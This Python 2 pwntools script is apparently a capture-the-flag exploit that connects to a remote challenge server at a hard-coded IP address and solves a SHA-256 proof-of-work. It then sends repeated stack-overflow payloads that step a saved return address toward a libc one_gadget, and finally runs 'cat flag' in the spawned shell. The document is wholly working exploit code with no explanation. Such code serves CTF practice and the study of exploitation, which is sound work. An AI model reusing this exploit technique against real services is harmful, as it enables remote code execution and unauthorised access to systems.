#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"
from pwn import *
from ctypes import c_uint8
from itertools import product
from hashlib import sha256

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global
EXEC = 0x0000555555554000

#io = remote("47.75.9.127", 9999)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
#io = process("./stack")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (addr))

chs = string.ascii_letters+string.digits

def proof(io):
    global chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

cnt = 0
while True:
    cnt += 1
    #print cnt
    #io = process("./stack", env = {"LD_PRELOAD" : "./libc.so.6"})
    #io = remote("47.75.9.127", 9999)
    try:
        io = remote("47.75.9.127", 9999)
        proof(io)
        io.recvuntil("size")
        io.sendline(str(c_uint8(0x0).value))

        #one_gadget = 0x4526a
        one_gadget = 0xf1147
        libc_start_main_ret = 0x20830
        times2 = (one_gadget%0x100)
        times1 = ((one_gadget>>8)&0xff)
        times0 = ((one_gadget>>16)&0xff) - ((libc_start_main_ret>>16)&0xff)

        times1 = 0xe1

        lucky = 0xe0

        for i in xrange(times0):
            text = io.recvuntil('content')
            if "no overflow" in text:
                io.close()
                continue
            rop  = ''
            rop += 'A'*0x2c
            rop += p32(0xffffffff)
            rop += chr(lucky+2)

            for ch in rop:
                assert(ord(ch) >= 0x20)

            io.sendline(rop)

        for i in xrange(times1):
            text = io.recvuntil('content')
            if "no overflow" in text:
                io.close()
                continue
            rop  = ''
            rop += 'A'*0x2c
            rop += p32(0xffffffff)
            rop += chr(lucky+1)

            for ch in rop:
                assert(ord(ch) >= 0x20)

            io.sendline(rop)

        io.recvuntil('content')
        rop  = ''
        rop += 'A'*0x3c
        rop += p32(0xffffffff)
        rop += chr(lucky)

        for ch in rop:
            assert(ord(ch) >= 0x20)

        io.sendline(rop)

        for i in xrange(times2-1):
            text = io.recvuntil('content')
            if "no overflow" in text:
                io.close()
                continue
            rop  = ''
            rop += 'A'*0x2c
            rop += p32(0xffffffff)
            rop += chr(lucky)

            for ch in rop:
                assert(ord(ch) >= 0x20)

            io.sendline(rop)

        #attach(0x400831)

        io.recvuntil('content')
        rop  = ''
        rop += 'A'*0x2c
        rop += p32(0xffffffff)
        rop += chr(lucky-0x10)
        for ch in rop:
            assert(ord(ch) >= 0x20)

        io.sendline(rop)


        io.recvuntil('content')
        io.sendline('\n')

        io.sendline("cat flag")
        io.recvline()
        flag = io.recvline()
        print flag
        if "ctf" in flag:
            break
        #io.interactive()

    except EOFError:
        #print 'hello'
        io.close()
        continue


io.interactive()
